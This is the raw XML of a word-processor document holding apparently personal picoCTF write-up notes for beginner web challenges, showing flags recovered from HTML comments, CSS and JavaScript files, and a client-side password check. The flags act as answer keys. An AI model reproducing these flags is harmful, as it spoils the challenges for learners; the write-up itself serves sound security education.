          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>view page source</w:t>
      </w:r>
      <w:bookmarkEnd w:id="44"/>
    </w:p>
    <w:p w14:paraId="17FBB6E8" w14:textId="7B377A78" w:rsidR="004C0F07" w:rsidRDefault="004C0F07" w:rsidP="00582B93">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="75" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004C0F07">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve">&lt;!-- Html is neat. Anyways have 1/3 of the flag: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004C0F07">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004C0F07">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>{tru3_d3 --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12F8FD4D" w14:textId="1B1F89C5" w:rsidR="00582B93" w:rsidRPr="00974072" w:rsidRDefault="004C0F07" w:rsidP="004A6D37">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="75"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>{}Style Editor -&gt; mycss.css</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CEBAE7D" w14:textId="661DEEDD" w:rsidR="004C0F07" w:rsidRDefault="004C0F07" w:rsidP="004C0F07">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004C0F07">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>/* You need CSS to make pretty pages. Here's part 2/3 of the flag: t3ct1ve_0r_ju5t */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A50FF2E" w14:textId="77777777" w:rsidR="004C0F07" w:rsidRDefault="004C0F07" w:rsidP="004C0F0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Debugger -&gt;myjs.js</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25618C52" w14:textId="77777777" w:rsidR="004C0F07" w:rsidRPr="004C0F07" w:rsidRDefault="004C0F07" w:rsidP="004C0F07">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5425F2FE" w14:textId="00E59E00" w:rsidR="004A6D37" w:rsidRDefault="004C0F07" w:rsidP="004C0F07">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004C0F07">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">/* </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004C0F07">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Javascript</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004C0F07">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> sure is neat. Anyways part 3/3 of the flag: </w:t>
      </w:r>
      <w:bookmarkStart w:id="45" w:name="_Hlk112454695"/>
      <w:r w:rsidRPr="004C0F07">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>_lucky?832b0699</w:t>
      </w:r>
      <w:bookmarkEnd w:id="45"/>
      <w:r w:rsidRPr="004C0F07">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>} */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77DA1F3A" w14:textId="0F04A697" w:rsidR="004C0F07" w:rsidRDefault="004C0F07" w:rsidP="004C0F07">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004C0F07">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004C0F07">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>{tru3_d3t3ct1ve_0r_ju5t_lucky?832b0699}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4077B0CB" w14:textId="4AC62F97" w:rsidR="00CD17CC" w:rsidRDefault="00CD17CC" w:rsidP="004C0F07">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="301C9783" w14:textId="53ED4665" w:rsidR="00CD17CC" w:rsidRDefault="00CD17CC" w:rsidP="004C0F07">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="79EA4A97"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Inspect HTML</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C3C8190"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8432AC9"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33CD20B6"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6CA8BA"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691D3C4" w14:textId="033B80E3"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66"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1CCC4009" w14:textId="062D8466"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view page source</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EFD294B" w14:textId="049FFD69" w:rsidR="00CD17CC" w:rsidRDefault="00CD17CC" w:rsidP="00CD17CC">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="75" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="236E25"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="236E25"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>&lt;!--</w:t>
      </w:r>
      <w:bookmarkStart w:id="46" w:name="_Hlk112454946"/>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="236E25"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="236E25"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>{1n5p3t0r_0f_h7ml_8113f7e2}</w:t>
      </w:r>
      <w:bookmarkEnd w:id="46"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="236E25"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>--&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50B2674F" w14:textId="47C91928" w:rsidR="00CD17CC" w:rsidRDefault="00CD17CC" w:rsidP="004C0F07">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CD17CC">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CD17CC">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>{1n5p3t0r_0f_h7ml_8113f7e2}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08D6E37C" w14:textId="36E1B841" w:rsidR="00CD17CC" w:rsidRDefault="00CD17CC" w:rsidP="004C0F07">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C6675E6" w14:textId="51C5BBB1" w:rsidR="00CD17CC" w:rsidRDefault="00CD17CC" w:rsidP="004C0F07">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="36A41F1F" w14:textId="77777777" w:rsidR="00CD17CC" w:rsidRDefault="00CD17CC" w:rsidP="00CD17C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Search source</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="514AB882"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A9541AC" w14:textId="77777777" w:rsidR="00CD17CC" w:rsidRDefault="00CD17CC" w:rsidP="00CD17C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0B053349" w14:textId="77777777" w:rsidR="00CD17CC" w:rsidRDefault="00CD17CC" w:rsidP="00CD17C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618D3C27" w14:textId="77777777" w:rsidR="00CD17CC" w:rsidRDefault="00CD17CC" w:rsidP="00CD17C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2498CB2" w14:textId="51E43F37" w:rsidR="00CD17CC" w:rsidRDefault="00CD17CC" w:rsidP="00CD17C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developer of this website mistakenly left an important artifact in the website source, can you find </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>it?The</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve"> website is </w:t>
      </w:r>
      <w:hyperlink r:id="rId67" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>here</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3C5A10DA" w14:textId="66454CF1"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p>
    <w:p w14:paraId="0BA599E9" w14:textId="012AFEEC"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4C57A12" wp14:editId="263CAFA4">
            <wp:extent cx="6332220" cy="338455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8"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="3384550"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="69825D21" w14:textId="7BF7F45B" w:rsidR="0044030E" w:rsidRDefault="0044030E" w:rsidP="00CD17C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270EF0C" wp14:editId="318F6CD6">
            <wp:extent cx="3475021" cy="95258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9"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3475021" cy="952583"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7266465C" w14:textId="58A628A3"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
    <w:p w14:paraId="02D784EA" w14:textId="77777777" w:rsidR="005F588A" w:rsidRDefault="005F588A" w:rsidP="005F588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Includes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2112B4E4"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5B244ED" w14:textId="77777777" w:rsidR="005F588A" w:rsidRDefault="005F588A" w:rsidP="005F588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030B2E7D" w14:textId="77777777" w:rsidR="005F588A" w:rsidRDefault="005F588A" w:rsidP="005F588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5F032496" w14:textId="77777777" w:rsidR="005F588A" w:rsidRDefault="005F588A" w:rsidP="005F588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69F6AA9" w14:textId="372FA76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70"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3A3711CF" w14:textId="6DB30CC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08FE6C04" w14:textId="1B92282D"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lastRenderedPageBreak/>
        <w:t>style.css</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="287B8C35"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body {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26BE833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background-color: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F588A">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>lightblue</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F588A">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75BC3356" w14:textId="4CF57F52" w:rsid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1224A9A"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00A5517" w14:textId="2D2704F2"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script.js</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="614D69D2" w14:textId="3F482749"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xml:space="preserve">/*  </w:t>
      </w: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  */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E17E9D2" w14:textId="0671F004"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p>
    <w:p w14:paraId="78105D2B"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function greetings()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26D33581"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0FB86B82"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 xml:space="preserve">  alert("This code is in a separate file!");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3101254E" w14:textId="77777777" w:rsidR="005F588A" w:rsidRPr="005F588A" w:rsidRDefault="005F588A" w:rsidP="005F588A">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="75"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F588A">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1400FB54" w14:textId="77777777" w:rsidR="005F588A" w:rsidRPr="005F588A" w:rsidRDefault="005F588A" w:rsidP="005F588A">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="75"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5C116AF2" w14:textId="6EDA6E7F" w:rsidR="005F588A" w:rsidRDefault="005F588A" w:rsidP="005F588A">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="75" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F588A">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>//  f7w_2of2_6edef411}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7971E0BC" w14:textId="372057F0" w:rsidR="005F588A" w:rsidRDefault="005F588A" w:rsidP="00CD17CC">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="75" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F588A">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F588A">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>{1nclu51v17y_1of2_f7w_2of2_6edef411}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29BE458D" w14:textId="5AEC8624" w:rsidR="00CD17CC" w:rsidRDefault="00CD17CC" w:rsidP="004C0F07">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3EE2F516" w14:textId="23E116F3" w:rsidR="00E84066" w:rsidRDefault="00E84066" w:rsidP="004C0F07">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40F10EDA" w14:textId="77777777" w:rsidR="00E84066" w:rsidRDefault="00E84066" w:rsidP="00E84066">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dont</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:t>-use-client-side</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AD398A2"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2937E15" w14:textId="77777777" w:rsidR="00E84066" w:rsidRDefault="00E84066" w:rsidP="00E840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0F58AF98" w14:textId="77777777" w:rsidR="00E84066" w:rsidRDefault="00E84066" w:rsidP="00E840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ALEX FULTON/DANNY</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58550407" w14:textId="77777777" w:rsidR="00E84066" w:rsidRDefault="00E84066" w:rsidP="00E840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0886805" w14:textId="77777777" w:rsidR="00E84066" w:rsidRDefault="00E84066" w:rsidP="00E840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break into this super secure portal? </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="F3A4B5"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>https://jupiter.challenges.picoctf.org/problem/37821/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t> (</w:t>
      </w:r>
      <w:hyperlink r:id="rId7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http://jupiter.challenges.picoctf.org:37821</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D3A2679" w14:textId="0AE29A4C" w:rsidR="00E84066" w:rsidRDefault="00E84066" w:rsidP="004C0F07">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3245FAC6" w14:textId="41B25B5E" w:rsidR="00E84066" w:rsidRDefault="00E84066" w:rsidP="004C0F07">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7267EC07" w14:textId="1CA57A96" w:rsidR="00E84066" w:rsidRDefault="00E84066" w:rsidP="004C0F07">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="50D23ED7" wp14:editId="2CC1A6EF">
            <wp:extent cx="6271803" cy="5098222"/>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2"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6271803" cy="5098222"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="135C89F0" w14:textId="60246D90" w:rsidR="00E84066" w:rsidRDefault="00E84066" w:rsidP="004C0F07">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B0DBD70" w14:textId="77777777" w:rsidR="00E84066" w:rsidRPr="00E84066" w:rsidRDefault="00E84066" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E84066">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>if (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E84066">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>checkpass.substring</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E84066">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>(0, split) == '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E84066">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>pico</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E84066">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>') {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59297DF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(split*6, split*7) == 'a3c8') {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27D1D4AE"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 split*2) == 'CTF{') {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37D8E549"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(split*4, split*5) == '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E84066">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>ts_p</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E84066">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>') {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16E105B4"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(split*3, split*4) == 'lien') {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51A4783F"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(split*5, split*6) == 'lz_1') {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DA5E905"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 xml:space="preserve">(split*2, split*3) == </w:t>
      </w:r>
      <w:bookmarkStart w:id="47" w:name="_Hlk112456791"/>
      <w:r w:rsidRPr="00E84066">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>'</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E84066">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>no_c</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E84066">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>'</w:t>
      </w:r>
      <w:bookmarkEnd w:id="47"/>
      <w:r w:rsidRPr="00E84066">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50E94061" w14:textId="77777777" w:rsidR="00E84066" w:rsidRPr="00E84066" w:rsidRDefault="00E84066" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E84066">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">                if (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E84066">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>checkpass.substring</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E84066">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>(split*7, split*8) == '9}') {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="708C220C" w14:textId="7401E98B" w:rsidR="00E84066" w:rsidRDefault="00E84066" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E84066">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">                  alert("Password Verified")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0869676B" w14:textId="4574D993" w:rsidR="00E84066" w:rsidRDefault="00E84066" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E84066">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E84066">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>{no_clients_plz_1a3c89}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ECBB0B3" w14:textId="574683C4" w:rsidR="008B4ABA" w:rsidRDefault="008B4ABA" w:rsidP="00E84066">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
